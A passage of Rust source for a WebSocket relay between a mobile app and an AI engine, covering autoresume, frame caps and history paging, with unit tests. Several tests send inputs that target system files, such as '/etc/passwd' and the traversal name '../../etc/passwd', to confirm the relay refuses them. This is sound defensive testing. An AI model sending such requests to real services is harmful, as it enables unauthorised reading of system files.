            // A revoke during a (re)dial belongs to this function, not to the pumps.
            Some(Control::Close(code, reason)) = ctl_rx.recv() => break 'splice (code, reason),
        };
        let upstream = match upstream {
            Ok((ws, _resp)) => ws,
            Err(err) => {
                if replay.is_some() && dial_attempts < AUTORESUME_ATTEMPTS {
                    // Bounded: the engine's restart window is short, and an app parked on a socket
                    // that will never splice again is worse than a clean close it can retry.
                    let backoff = AUTORESUME_BACKOFF_MS << (dial_attempts - 1);
                    eprintln!(
                        "relay: autoresume dial {dial_attempts}/{AUTORESUME_ATTEMPTS} failed: {err}; retrying in {backoff} ms"
                    );
                    tokio::time::sleep(Duration::from_millis(backoff)).await;
                    continue 'splice;
                }
                eprintln!("relay: engine unreachable at {url}: {err}");
                let reason = if replay.is_some() {
                    "autoresume failed"
                } else {
                    "engine unreachable"
                };
                break 'splice (CLOSE_ENGINE_DOWN, reason.to_string());
            }
        };
        eprintln!("relay: upstream open");
        let (mut up_tx, mut up_rx) = upstream.split();

        // The replay goes first: the app's next prompt must find an attached session, and the
        // engine's answer to it is consumed (see `process_engine_frame`), never handed to the app.
        if let Some(frame) = replay.take() {
            if up_tx.send(TgMsg::Text(frame.into())).await.is_err() {
                eprintln!("relay: autoresume replay could not be sent; closing the app");
                break 'splice (CLOSE_ENGINE_DOWN, "autoresume failed".to_string());
            }
            eprintln!("relay: autoresume replay sent to the engine");
        }

        // Locally answered frames (history pages) travel on a channel: the client's sink belongs to
        // the engine→client future, and a second writer would need the same socket.
        let (local_tx, mut local_rx) = mpsc::channel::<String>(8);
        // Frames the engine→client future must send *upstream* (capabilities, declined requests):
        // for the same reason in the other direction.
        let (extra_tx, mut extra_rx) = mpsc::channel::<String>(8);

        let client_state = state.clone();
        let client_activity = activity.clone();
        let client_to_engine = async {
            let mut first = true;
            loop {
                tokio::select! {
                    extra = extra_rx.recv() => {
                        match extra {
                            Some(extra) => {
                                if up_tx.send(TgMsg::Text(extra.into())).await.is_err() {
                                    eprintln!("relay: upstream send failed (engine closed)");
                                    return (CLOSE_ENGINE_DOWN, "engine closed");
                                }
                                note_activity(&client_activity);
                            }
                            None => return (CLOSE_ENGINE_DOWN, "engine closed"),
                        }
                    }
                    incoming = client_rx.next() => {
                        let msg = match incoming {
                            Some(Ok(msg)) => msg,
                            Some(Err(err)) => {
                                eprintln!("relay: client read error: {err}");
                                return (CLOSE_ENGINE_DOWN, "client read error");
                            }
                            None => return (1001, "client closed"),
                        };
                        if let AxMsg::Text(text) = &msg {
                            if first {
                                eprintln!("relay: first client frame: {}", preview(text.as_str()));
                            }
                            first = false;
                        } else if first {
                            eprintln!("relay: first client frame: <non-text>");
                            first = false;
                        }

                        if let AxMsg::Text(text) = &msg {
                            // `__main__.py:80` pins the client socket's `max_size` to the frame cap, so a
                            // message is capped as a whole before it is split into frames. Without this a
                            // 60 MiB message of small lines would slip past the per-line check.
                            if text.len() > frame_cap {
                                eprintln!(
                                    "relay: closing 1009: frame_too_large (cap {frame_cap} bytes, message {} bytes)",
                                    text.len()
                                );
                                client_state.note("frame_too_large", Event {
                                    bytes: Some(text.len()),
                                    reason: Some("frame_too_large"),
                                    direction: Some("client_to_gateway"),
                                    ..Event::default()
                                });
                                return (CLOSE_TOO_BIG, "frame_too_large");
                            }
                            let frames = match split_frames(text.as_str(), frame_cap) {
                                Ok(frames) => frames,
                                Err(reason) => {
                                    eprintln!(
                                        "relay: closing 1009: {reason} (cap {frame_cap} bytes, message {} bytes)",
                                        text.len()
                                    );
                                    client_state.note("frame_too_large", Event {
                                        bytes: Some(text.len()),
                                        reason: Some(reason),
                                        direction: Some("client_to_gateway"),
                                        ..Event::default()
                                    });
                                    return (CLOSE_TOO_BIG, reason);
                                }
                            };
                            for line in frames {
                                let outgoing = match process_client_frame(&client_state, line) {
                                    ClientAction::Forward(None) => Some(line.to_string()),
                                    ClientAction::Forward(Some(wire)) => Some(wire),
                                    ClientAction::Answer(frame) => {
                                        let payload = serde_json::to_string(&frame).unwrap_or_default();
                                        if local_tx.send(payload).await.is_err() {
                                            eprintln!("relay: local answer undeliverable");
                                            return (1001, "client closed");
                                        }
                                        None
                                    }
                                    ClientAction::Drop => None,
                                };
                                if let Some(payload) = outgoing {
                                    if up_tx.send(TgMsg::Text(payload.into())).await.is_err() {
                                        eprintln!("relay: upstream send failed (engine closed)");
                                        return (CLOSE_ENGINE_DOWN, "engine closed");
                                    }
                                    note_activity(&client_activity);
                                }
                            }
                            continue;
                        }
                        match ax_to_tg(msg) {
                            Some(out) => {
                                if up_tx.send(out).await.is_err() {
                                    eprintln!("relay: upstream send failed (engine closed)");
                                    return (CLOSE_ENGINE_DOWN, "engine closed");
                                }
                                note_activity(&client_activity);
                            }
                            None => continue,
                        }
                    }
                }
            }
        };

        let engine_state = state.clone();
        let engine_activity = activity.clone();
        // Not `move`: the sink must come back to this scope so the close frame below can be sent on
        // whichever branch won the select (including revocation, which belongs to neither pump).
        let engine_to_client = async {
            let mut first = true;
            loop {
                tokio::select! {
                    // `biased` so a history page the app is waiting on does not queue behind a burst of
                    // engine events. A host frame is rarer than either and must not wait for a
                    // transcript to finish streaming, so it is asked first — its queue is tiny.
                    biased;
                    frame = host_frames.recv() => {
                        match frame {
                            Ok(line) => {
                                if client_tx.send(text_frame(line)).await.is_err() {
                                    eprintln!("relay: client send failed (host event)");
                                    return (1001, "client closed");
                                }
                                note_activity(&engine_activity);
                            }
                            // A socket this far behind has nothing left worth delivering; the app
                            // re-reads the conversation when it next opens it.
                            Err(broadcast::error::RecvError::Lagged(skipped)) => {
                                eprintln!("relay: skipped {skipped} host frame(s) for a slow socket");
                            }
                            // The registry outlives every connection, so this never fires.
                            Err(broadcast::error::RecvError::Closed) => {}
                        }
                    }
                    Some(answer) = local_rx.recv() => {
                        if client_tx.send(text_frame(answer)).await.is_err() {
                            eprintln!("relay: client send failed (local answer)");
                            return (1001, "client closed");
                        }
                        note_activity(&engine_activity);
                    }
                    incoming = up_rx.next() => {
                        let msg = match incoming {
                            Some(Ok(msg)) => msg,
                            Some(Err(err)) => {
                                eprintln!("relay: upstream read error: {err}");
                                return (CLOSE_ENGINE_DOWN, "engine closed");
                            }
                            None => return (CLOSE_ENGINE_DOWN, "engine closed"),
                        };
                        if first {
                            match &msg {
                                TgMsg::Text(t) => {
                                    eprintln!("relay: first engine frame: {}", preview(t.as_str()))
                                }
                                TgMsg::Close(c) => {
                                    eprintln!("relay: engine closed immediately: {c:?}")
                                }
                                _ => eprintln!("relay: first engine frame: <non-text>"),
                            }
                            first = false;
                        }
                        // 4001 is the engine restarting: the app must not see it, because the relay is
                        // about to reattach the same session and splice again.
                        if let TgMsg::Close(Some(frame)) = &msg {
                            if u16::from(frame.code) == CLOSE_ENGINE_RESTART {
                                eprintln!(
                                    "relay: engine closed {CLOSE_ENGINE_RESTART} (restart); keeping the app open"
                                );
                                return (CLOSE_ENGINE_RESTART, "engine restart");
                            }
                        }
                        if let TgMsg::Text(text) = &msg {
                            let frames = match split_frames(text.as_str(), frame_cap) {
                                Ok(frames) => frames,
                                Err(reason) => {
                                    eprintln!(
                                        "relay: closing 1009: {reason} (cap {frame_cap} bytes, message {} bytes)",
                                        text.len()
                                    );
                                    engine_state.note("frame_too_large", Event {
                                        bytes: Some(text.len()),
                                        reason: Some(reason),
                                        direction: Some("client_to_gateway"),
                                        ..Event::default()
                                    });
                                    return (CLOSE_TOO_BIG, reason);
                                }
                            };
                            for line in frames {
                                let action = process_engine_frame(&engine_state, line);
                                if engine_state.autoresume_failed.swap(false, Ordering::SeqCst) {
                                    eprintln!(
                                        "relay: the engine refused the autoresume; closing the app with {CLOSE_ENGINE_DOWN}"
                                    );
                                    return (CLOSE_ENGINE_DOWN, "autoresume failed");
                                }
                                if let Some(payload) = action.to_engine {
                                    if extra_tx.send(payload).await.is_err() {
                                        eprintln!("relay: upstream send failed (engine closed)");
                                        return (CLOSE_ENGINE_DOWN, "engine closed");
                                    }
                                }
                                if action.swallow {
                                    continue;
                                }
                                let payload = action
                                    .to_client
                                    .unwrap_or_else(|| line.to_string());
                                if client_tx.send(text_frame(payload)).await.is_err() {
                                    eprintln!("relay: client send failed (app closed)");
                                    return (1001, "client closed");
                                }
                                note_activity(&engine_activity);
                                if action.send_caps {
                                    let caps = json!({
                                        "jsonrpc": "2.0",
                                        "id": BRIDGE_CAPABILITIES_ID,
                                        "method": "client.capabilities",
                                        "params": { "server_requests": true },
                                    });
                                    if extra_tx
                                        .send(serde_json::to_string(&caps).unwrap_or_default())
                                        .await
                                        .is_err()
                                    {
                                        eprintln!("relay: upstream send failed (engine closed)");
                                        return (CLOSE_ENGINE_DOWN, "engine closed");
                                    }
                                }
                            }
                            continue;
                        }
                        match tg_to_ax(msg) {
                            Some(out) => {
                                if client_tx.send(out).await.is_err() {
                                    eprintln!("relay: client send failed (app closed)");
                                    return (1001, "client closed");
                                }
                                note_activity(&engine_activity);
                            }
                            None => continue,
                        }
                    }
                }
            }
        };

        // Whichever side ends first tears down the other; a half-open splice leaks a socket otherwise.
        // A revocation arrives from neither side, so it is a third branch.
        let (code, reason) = tokio::select! {
            outcome = client_to_engine => (outcome.0, outcome.1.to_string()),
            outcome = engine_to_client => (outcome.0, outcome.1.to_string()),
            Some(Control::Close(code, reason)) = ctl_rx.recv() => (code, reason),
        };

        if code == CLOSE_ENGINE_RESTART && !autoresumed {
            autoresumed = true;
            match state.next_autoresume_frame() {
                Some(frame) => {
                    eprintln!(
                        "relay: reconnecting and replaying the last resume (one attempt per connection)"
                    );
                    let profile = state
                        .last_resume()
                        .map(|target| target.profile)
                        .unwrap_or_default();
                    state.note("session_autoresume", Event {
                        method: Some("session.resume"),
                        profile: (!profile.is_empty()).then_some(profile.as_str()),
                        outcome: Some("resuming"),
                        ..Event::default()
                    });
                    state.after_engine_restart();
                    replay = Some(frame);
                    dial_attempts = 0;
                    continue 'splice;
                }
                None => {
                    eprintln!(
                        "relay: engine closed {CLOSE_ENGINE_RESTART} but nothing was resumed; closing the app"
                    );
                    break 'splice (CLOSE_ENGINE_DOWN, "engine restarted".to_string());
                }
            }
        }
        break 'splice (code, reason);
    };

    // Close reasons are prose in the relay and slugs in the audit (`engine_unreachable`).
    state.note(
        "ws_close",
        Event {
            reason: Some(&crate::audit::slug(&reason)),
            outcome: Some("closed"),
            close_code: Some(code),
            ..Event::default()
        },
    );
    let _ = client_tx
        .send(AxMsg::Close(Some(CloseFrame {
            code,
            reason: reason.into(),
        })))
        .await;
    drop(keepalive);
    drop(registration);
}

#[cfg(test)]
mod tests {
    use super::*;
    use axum::extract::ws::WebSocketUpgrade;
    use std::net::SocketAddr;
    use std::time::Duration;
    use tokio::net::TcpListener;
    use tokio::time::timeout;

    fn encode(value: &Value) -> String {
        serde_json::to_string(value).expect("value serialises")
    }

    /// Next text frame from a socket, failing the test rather than hanging if the relay goes quiet.
    async fn next_text<S>(ws: &mut tokio_tungstenite::WebSocketStream<S>) -> String
    where
        S: tokio::io::AsyncRead + tokio::io::AsyncWrite + Unpin,
    {
        loop {
            let msg = timeout(Duration::from_secs(10), ws.next())
                .await
                .expect("the relay did not answer in time")
                .expect("the socket closed early")
                .expect("a frame failed to decode");
            if let TgMsg::Text(text) = msg {
                return text.to_string();
            }
        }
    }

    /// The close code the relay sent, failing if the socket dies without one.
    async fn next_close<S>(ws: &mut tokio_tungstenite::WebSocketStream<S>) -> u16
    where
        S: tokio::io::AsyncRead + tokio::io::AsyncWrite + Unpin,
    {
        loop {
            let msg = timeout(Duration::from_secs(10), ws.next())
                .await
                .expect("the relay did not close in time")
                .expect("the socket ended without a close frame")
                .expect("a frame failed to decode");
            match msg {
                TgMsg::Close(Some(frame)) => return u16::from(frame.code),
                TgMsg::Close(None) => panic!("the relay closed without a code"),
                _ => continue,
            }
        }
    }

    fn transcript(count: usize) -> Vec<Value> {
        (0..count)
            .map(|i| json!({"id": format!("m{i:03}"), "role": "user", "content": "x".repeat(200)}))
            .collect()
    }

    // -- one render, every id ---------------------------------------------------------------
    //
    // The engine builds the whole transcript per resume (measured 6.2 s / 7.5 MiB on a 6.8k-row
    // chat) and answers concurrent ones strictly in turn (6.2 s, 12.6 s, 18.5 s). The app retries
    // an open it is waiting on, so the relay answers every repeat from the first reply.

    #[test]
    fn a_repeat_resume_is_answered_from_the_one_render() {
        let state = ConnectionState::new();
        let first = json!({
            "jsonrpc": "2.0", "id": 1, "method": "session.resume",
            "params": {"session_id": "s1", "profile": "bot"},
        });
        let repeat = json!({
            "jsonrpc": "2.0", "id": 2, "method": "session.resume",
            "params": {"session_id": "s1", "profile": "bot"},
        });
        assert!(matches!(process_client_frame(&state, &encode(&first)),
                          ClientAction::Forward(_)), "the first ask reaches the engine");
        assert!(matches!(process_client_frame(&state, &encode(&repeat)),
                          ClientAction::Drop),
                "the second must not cost a second render");

        let rows = transcript(400);
        let reply = json!({"jsonrpc": "2.0", "id": 1, "result": {
            "session_id": "runtime-1", "messages": rows,
        }});
        let answer = inspect_engine_text(&state, &encode(&reply)).expect("rewritten");
        let lines: Vec<Value> = answer
            .lines()
            .map(|line| serde_json::from_str(line).expect("each line is a frame"))
            .collect();
        assert_eq!(lines.len(), 2, "both ids are answered in one write");
        assert_eq!(lines[0]["id"], json!(1));
        assert_eq!(lines[1]["id"], json!(2), "the retry sees its own id");
        for line in &lines {
            assert_eq!(line["result"]["messages"].as_array().unwrap().len(), 200,
                       "and the same newest page, not 6,000 rows");
            assert_eq!(line["result"]["history"]["total"], json!(400));
        }
    }

    #[test]
    fn a_repeat_for_another_conversation_is_still_a_real_request() {
        let state = ConnectionState::new();
        let a = json!({"jsonrpc": "2.0", "id": 1, "method": "session.resume",
                       "params": {"session_id": "s1", "profile": "bot"}});
        let b = json!({"jsonrpc": "2.0", "id": 2, "method": "session.resume",
                       "params": {"session_id": "s2", "profile": "bot"}});
        assert!(matches!(process_client_frame(&state, &encode(&a)), ClientAction::Forward(_)));
        assert!(matches!(process_client_frame(&state, &encode(&b)), ClientAction::Forward(_)),
                "another bot's chat must open on its own request");
    }

    // -- paging (pre-existing behaviour, kept honest by these same tests) ----------------------

    #[test]
    fn a_resume_reply_is_paged_and_its_older_pages_are_answered_locally() {
        let state = ConnectionState::new();
        let rows = transcript(400);
        let resume = json!({
            "jsonrpc": "2.0", "id": 1, "method": "session.resume",
            "params": {"session_id": "s1", "profile": "bot"},
        });
        assert!(
            inspect_client_text(&state, &encode(&resume)).is_none(),
            "the resume itself must reach the engine"
        );

        let reply = json!({"jsonrpc": "2.0", "id": 1, "result": {
            "session_id": "runtime-1", "messages": rows,
        }});
        let paged = inspect_engine_text(&state, &encode(&reply))
            .expect("the resume reply is rewritten in place");
        let paged: Value = serde_json::from_str(&paged).unwrap();
        assert_eq!(paged["result"]["messages"].as_array().unwrap().len(), 200);
        assert_eq!(paged["result"]["history"]["total"], json!(400));
        let cursor = paged["result"]["history"]["cursor"]
            .as_i64()
            .expect("the rest of the transcript needs a cursor");
        assert_eq!(cursor, 200);

        let ask = json!({
            "jsonrpc": "2.0", "id": 42, "method": "session.history",
            "params": {"session_id": "s1", "profile": "bot", "cursor": cursor, "limit": 150},
        });
        let answer = inspect_client_text(&state, &encode(&ask))
            .expect("an older page is answered by the relay, not forwarded");
        let answer: Value = serde_json::from_str(&answer).unwrap();
        assert_eq!(answer["id"], json!(42), "the client's id is echoed");
        let page = answer["result"]["messages"].as_array().unwrap();
        assert_eq!(page.len(), 150);
        assert_eq!(page[0]["id"], json!("m050"), "ends where the resume's page begins");
        assert_eq!(answer["result"]["cursor"], json!(50));
        assert_eq!(answer["result"]["total"], json!(400));

        let ask = json!({
            "jsonrpc": "2.0", "id": 43, "method": "session.history",
            "params": {"session_id": "s1", "profile": "bot", "cursor": 50, "limit": 150},
        });
        let answer: Value =
            serde_json::from_str(&inspect_client_text(&state, &encode(&ask)).unwrap()).unwrap();
        assert_eq!(answer["result"]["messages"].as_array().unwrap().len(), 50);
        assert_eq!(answer["result"]["cursor"], Value::Null, "the start is reached");
        assert_eq!(answer["result"]["messages"][0]["id"], json!("m000"));
    }

    #[test]
    fn a_history_page_for_a_session_this_socket_never_resumed_is_refused() {
        let state = ConnectionState::new();
        let ask = json!({
            "jsonrpc": "2.0", "id": 9, "method": "session.history",
            "params": {"session_id": "never-resumed", "profile": "bot", "cursor": 10},
        });
        let answer: Value =
            serde_json::from_str(&inspect_client_text(&state, &encode(&ask)).unwrap()).unwrap();
        assert_eq!(answer["id"], json!(9));
        assert_eq!(answer["error"]["code"], json!(-32001));
        assert!(answer.get("result").is_none());
    }

    #[test]
    fn two_bots_on_one_socket_do_not_read_each_others_rows() {
        let state = ConnectionState::new();
        for (id, profile, marker) in [(1, "bot-a", "a"), (2, "bot-b", "b")] {
            let resume = json!({
                "jsonrpc": "2.0", "id": id, "method": "session.resume",
                "params": {"session_id": "same-session", "profile": profile},
            });
            inspect_client_text(&state, &encode(&resume));
            let reply = json!({"jsonrpc": "2.0", "id": id, "result": {"messages": [
                {"id": format!("{marker}0"), "content": "x"}, {"id": format!("{marker}1"), "content": "x"},
            ]}});
            inspect_engine_text(&state, &encode(&reply)).expect("paged");
        }
        let ask = json!({
            "jsonrpc": "2.0", "id": 5, "method": "session.history",
            "params": {"session_id": "same-session", "profile": "bot-b", "cursor": 1},
        });
        let answer: Value =
            serde_json::from_str(&inspect_client_text(&state, &encode(&ask)).unwrap()).unwrap();
        assert_eq!(answer["result"]["messages"][0]["id"], json!("b0"));
    }

    #[test]
    fn frames_the_relay_does_not_own_are_forwarded_unchanged() {
        let state = ConnectionState::new();
        // A cursorless `session.history` is the app's old call: the engine answers it.
        let cursorless = json!({
            "jsonrpc": "2.0", "id": 4, "method": "session.history",
            "params": {"session_id": "s1"},
        });
        assert!(inspect_client_text(&state, &encode(&cursorless)).is_none());
        // An ordinary prompt that merely mentions the method name.
        let prompt = json!({
            "jsonrpc": "2.0", "id": 5, "method": "prompt.submit",
            "params": {"text": "what does session.history do?"},
        });
        assert!(inspect_client_text(&state, &encode(&prompt)).is_none());
        let event = json!({"jsonrpc": "2.0", "method": "event",
                           "params": {"type": "gateway.ready", "content": "hello"}});
        assert!(inspect_engine_text(&state, &encode(&event)).is_none());
        // Unparseable text is still relayed byte-for-byte.
        assert!(inspect_client_text(&state, "not json at all").is_none());
        assert!(inspect_engine_text(&state, "not json at all").is_none());
    }

    #[test]
    fn a_resume_without_an_id_is_not_tracked_so_its_reply_stays_whole() {
        let state = ConnectionState::new();
        let notice = json!({"jsonrpc": "2.0", "method": "session.resume",
                            "params": {"session_id": "s1"}});
        assert!(inspect_client_text(&state, &encode(&notice)).is_none());
        let reply = json!({"jsonrpc": "2.0", "id": 1, "result": {"messages": transcript(5)}});
        assert!(inspect_engine_text(&state, &encode(&reply)).is_none());
    }

    #[test]
    fn a_three_point_four_megabyte_resume_pages_through_the_relay_to_the_first_row() {
        let state = ConnectionState::new();
        let rows: Vec<Value> = (0..1450)
            .map(|i| {
                json!({"id": format!("m{i:04}"), "role": "assistant", "content": "x".repeat(2400)})
            })
            .collect();
        let resume = json!({
            "jsonrpc": "2.0", "id": 7, "method": "session.resume",
            "params": {"session_id": "big", "profile": "bot"},
        });
        inspect_client_text(&state, &encode(&resume));

        let reply = json!({"jsonrpc": "2.0", "id": 7, "result": {
            "session_id": "big", "message_count": 1450, "messages": rows,
        }});
        let raw = encode(&reply);
        assert!(raw.len() > 3 * 1024 * 1024, "the whole resume is {} bytes", raw.len());
        let paged = inspect_engine_text(&state, &raw).expect("the resume is paged");
        assert!(
            paged.len() < 600 * 1024,
            "the frame iOS receives is still {} bytes",
            paged.len()
        );
        let mut paged: Value = serde_json::from_str(&paged).unwrap();
        assert_eq!(paged["result"]["history"]["total"], json!(1450));
        let mut cursor = paged["result"]["history"]["cursor"].as_i64().unwrap();
        let mut seen = paged["result"]["messages"].as_array().unwrap().len();
        assert_eq!(seen, 200);
        assert_eq!(cursor, 1250);

        // Then page all the way back exactly as the app would, proving every reply is bounded, every
        // page is contiguous, and the whole 1450-row transcript is reachable — nothing skipped and
        // nothing repeated.
        let mut guard = 0;
        while cursor > 0 {
            let ask = json!({
                "jsonrpc": "2.0", "id": 100 + guard, "method": "session.history",
                "params": {"session_id": "big", "profile": "bot", "cursor": cursor, "limit": 150},
            });
            let answer = inspect_client_text(&state, &encode(&ask))
                .expect("older pages are answered by the relay");
            assert!(answer.len() < 600 * 1024);
            paged = serde_json::from_str(&answer).unwrap();
            let page = paged["result"]["messages"].as_array().unwrap();
            let expected = (cursor as usize).min(150);
            assert_eq!(page.len(), expected);
            assert_eq!(page[0]["id"], json!(format!("m{:04}", cursor - expected as i64)));
            assert_eq!(page[expected - 1]["id"], json!(format!("m{:04}", cursor - 1)));
            seen += page.len();
            cursor = paged["result"]["cursor"].as_i64().map_or(0, |c| c);
            guard += 1;
            assert!(guard < 100, "paging never reached the first row");
        }
        assert_eq!(seen, 1450);
    }

    #[test]
    fn an_oversized_frame_that_is_not_a_pageable_resume_is_trimmed_and_flagged() {
        let state = ConnectionState::new();
        let monster = json!({
            "jsonrpc": "2.0", "method": "event",
            "params": {"type": "tool.output", "content": "z".repeat(3 * 1024 * 1024)},
        });
        let raw = encode(&monster);
        let rewritten = inspect_engine_text(&state, &raw).expect("an oversized frame is trimmed");
        assert!(rewritten.len() <= history::MAX_RELAY_BYTES);
        let trimmed: Value = serde_json::from_str(&rewritten).unwrap();
        assert!(trimmed["_hermeyd_trimmed"]["field"].is_string());
        assert!(trimmed["params"]["type"] == json!("tool.output"));
    }

    /// A state with a real audit file, so the wiring (not just `AuditLog::emit`) is exercised.
    fn audited_state(tag: &str) -> (ConnectionState, Arc<AuditLog>, std::path::PathBuf) {
        let dir = std::env::temp_dir().join(format!(
            "hermeyd-relay-audit-{tag}-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_nanos())
                .unwrap_or(0)
        ));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("scratch");
        let log = Arc::new(AuditLog::at(dir.join("audit.jsonl"), 1_000_000));
        (
            ConnectionState::with_audit(Some(Arc::clone(&log)), Some("phone-abcdef012345".into())),
            log,
            dir,
        )
    }

    /// The refusal the relay sends must be visible in the audit file as a method and a reason —
    /// and the params it refused must not be. This is the relay half of `audit.py`'s contract.
    #[test]
    fn relay_policy_events_are_audited_without_payloads() {
        let (state, log, dir) = audited_state("policy");

        // A hard-denied method carrying a host path.
        let (_, code, _) = refusal(client(
            &state,
            &json!({"jsonrpc": "2.0", "id": 1, "method": "image.attach",
                    "params": {"path": "/etc/passwd"}}),
        ));
        assert_eq!(code, ERROR_METHOD_NOT_FOUND);

        // An allow-listed attachment method with a traversing filename.
        let (_, code, message) = refusal(client(
            &state,
            &json!({"jsonrpc": "2.0", "id": 2, "method": "file.attach", "params": {
                "session_id": "s-1", "name": "../../etc/passwd",
                "data_url": "data:application/octet-stream;base64,AAAA"}}),
        ));
        assert_eq!(code, -32602);
        assert_eq!(message, "invalid attachment");

        // An allowed request, with a credential-shaped param that must not be recorded.
        assert!(matches!(
            client(
                &state,
                &json!({"jsonrpc": "2.0", "id": 3, "method": "session.list",
                        "params": {"token": "sk-live-SUPER-SECRET"}}),
            ),
            ClientAction::Forward(_)
        ));

        let text = std::fs::read_to_string(log.path()).expect("audit file");
        assert!(!text.contains("/etc/passwd"), "a refused path reached the log: {text}");
        assert!(!text.contains("sk-live-SUPER-SECRET"), "a credential reached the log");
        assert!(!text.contains("data:application"), "an attachment payload reached the log");

        let allowed = log.last("client_request").expect("allowed request recorded");
        assert_eq!(allowed["method"], "session.list");
        assert_eq!(allowed["device"], "phone-ab");
        assert_eq!(allowed["direction"], "client_to_gateway");

        let reasons: Vec<String> = log
            .all("client_request_rejected")
            .iter()
            .map(|record| record["reason"].as_str().unwrap_or("").to_string())
            .collect();
        assert_eq!(reasons, vec!["method_not_allowed", "invalid_attachment"]);
        let denied = log.all("client_request_rejected");
        assert_eq!(denied[0]["method"], "image.attach");
        assert_eq!(denied[1]["method"], "file.attach");

        let _ = std::fs::remove_dir_all(&dir);
    }

    /// The other three relay-level events the task named: an aliased session, a trimmed frame and
    /// an autoresume. Each carries identifiers/sizes, never the ids or the transcript.
    #[test]
    fn alias_trim_and_autoresume_are_audited_with_sizes_not_content() {
        let (state, log, dir) = audited_state("events");

        // An aliased session: the frame is rewritten to the runtime id, the log records the fact.
        lock(&state.aliases).insert("stored-id".into(), "runtime-id".into());
        let mut frame = json!({"jsonrpc": "2.0", "method": "session.history",
                               "params": {"session_id": "stored-id"}});
        assert!(adopt_alias(&state, &mut frame));
        assert_eq!(frame["params"]["session_id"], "runtime-id");
        let rekeyed = log.last("session_rekeyed").expect("alias recorded");
        assert_eq!(rekeyed["method"], "session.history");
        assert_eq!(rekeyed["outcome"], "adopted");

        // A trimmed engine frame: the size received is recorded, the text is not.
        let monster = json!({
            "jsonrpc": "2.0", "method": "event",
            "params": {"type": "tool.output", "content": "z".repeat(3 * 1024 * 1024)},
        });
        let raw = encode(&monster);
        assert!(inspect_engine_text(&state, &raw).is_some());
        let trimmed = log.last("frame_trimmed").expect("trim recorded");
        assert_eq!(trimmed["bytes"], raw.len());
        assert_eq!(trimmed["outcome"], "trimmed");

        // An autoresume that adopted a new runtime id.
        let reply = json!({"jsonrpc": "2.0", "id": "__hermesd_autoresume__1",
                           "result": {"session_id": "fresh-id"}});
        adopt_restarted_session(&state, &reply, &history::HistoryKey::new("old-id", "cody"));
        let resumed = log.last("session_autoresume").expect("autoresume recorded");
        assert_eq!(resumed["outcome"], "resumed");

        let text = std::fs::read_to_string(log.path()).expect("audit file");
        for secret in ["stored-id", "runtime-id", "fresh-id", "zzzzz"] {
            assert!(!text.contains(secret), "{secret} reached the log: {text}");
        }

        let _ = std::fs::remove_dir_all(&dir);
    }

    // -- policy ------------------------------------------------------------------------------

    fn client(state: &ConnectionState, value: &Value) -> ClientAction {
        process_client_frame(state, &encode(value))
    }

    /// A forwarded request, parsed. `skills.manage` is always re-serialized, so this is the shape
    /// that actually reaches the engine.
    fn forwarded(action: ClientAction) -> Value {
        match action {
            ClientAction::Forward(Some(wire)) => serde_json::from_str(&wire).expect("forwarded JSON"),
            ClientAction::Forward(None) => panic!("expected a rewritten frame, got a byte forward"),
            ClientAction::Answer(frame) => panic!("expected a forward, got {frame}"),
            ClientAction::Drop => panic!("expected a forward, got a drop"),
        }
    }

    fn refusal(action: ClientAction) -> (Value, i64, String) {
        match action {
            ClientAction::Answer(frame) => {
                let code = frame["error"]["code"].as_i64().expect("an error code");
                let message = frame["error"]["message"]
                    .as_str()
                    .expect("an error message")
                    .to_string();
                (frame["id"].clone(), code, message)
            }
            _ => panic!("the frame was not refused"),
        }
    }

    // -- the office documents on the wire -----------------------------------------------------

    /// The send path refusing what the bytes contradict, with the sentence the app shows: the
    /// Python-shaped refusals around it stay fixed, so this one stands out on purpose.
    #[test]
    fn a_mislabelled_document_is_refused_with_the_reason_it_disagrees() {
        use crate::office::fixtures;
        use base64::Engine as _;

        let state = ConnectionState::new();
        let (_, code, message) = refusal(client(
            &state,
            &json!({"jsonrpc": "2.0", "id": 4, "method": "file.attach",
                    "params": {"session_id": "s-1", "name": "budget.xlsx",
                               "data_url": format!("data:application/octet-stream;base64,{}",
                                                   base64::engine::general_purpose::STANDARD
                                                       .encode(fixtures::pdf_fixture("x")))}}),
        ));
        assert_eq!(code, -32602);
        assert!(message.contains("budget.xlsx") && message.contains("Excel"), "{message}");

        // A traversal is still the bridge's own fixed refusal: nothing else started echoing.
        let (_, code, message) = refusal(client(
            &state,
            &json!({"jsonrpc": "2.0", "id": 5, "method": "file.attach",
                    "params": {"session_id": "s-1", "name": "../../etc/passwd",
                               "data_url": "data:application/octet-stream;base64,AAAA"}}),
        ));
        assert_eq!(code, -32602);
        assert_eq!(message, "invalid attachment");
    }

    /// The delivery half: a prompt that references a document reaches the engine with the
    /// document's text appended, the `@file:` reference still in place for the app to fetch by.
    #[test]
    fn a_prompt_referencing_a_document_carries_its_text_to_the_engine() {
        use crate::office::fixtures;
        use crate::test_support::scratch;

        let dir = scratch("prompt-docs");
        let attachments = dir.join("profiles").join("cody").join("attachments");
        std::fs::create_dir_all(&attachments).unwrap();
        std::fs::write(attachments.join("budget.xlsx"), fixtures::xlsx_fixture()).unwrap();
        // A document that exists, but not under the host's own root: it is not this service's to
        // read into a prompt.
        let outside = scratch("prompt-outside");
        std::fs::write(outside.join("secret.xlsx"), fixtures::xlsx_fixture()).unwrap();
        let state = ConnectionState::new().with_home(dir.clone());

        let staged = attachments.join("budget.xlsx");
        let reference = format!("@file:{}", staged.display());
        let action = client(
            &state,
            &json!({"jsonrpc": "2.0", "id": 1, "method": "prompt.submit",
                    "params": {"session_id": "s-1",
                               "text": format!("{reference}\n\nwhat does Q4 say?")}}),
        );
        let forwarded = forwarded(action);
        let text = forwarded["params"]["text"].as_str().unwrap();
        assert!(text.starts_with(&reference), "the reference must survive: {text}");
        assert!(text.contains("what does Q4 say?"), "{text}");
        assert!(text.contains("--- attachment: budget.xlsx (sheet:"), "{text}");
        assert!(text.contains("North | 42"), "{text}");

        // A second prompt carrying the same document grows no second copy of the block: the
        // block is already there, so the frame travels byte-for-byte.
        let again = client(
            &state,
            &json!({"jsonrpc": "2.0", "id": 2, "method": "prompt.submit",
                    "params": {"session_id": "s-1", "text": text}}),
        );
        let text_again = match again {
            ClientAction::Forward(None) => text.to_string(),
            ClientAction::Forward(Some(wire)) => serde_json::from_str::<Value>(&wire)
                .expect("forwarded JSON")["params"]["text"]
                .as_str()
                .expect("text")
                .to_string(),
            other => panic!("unexpected action: {other:?}"),
        };
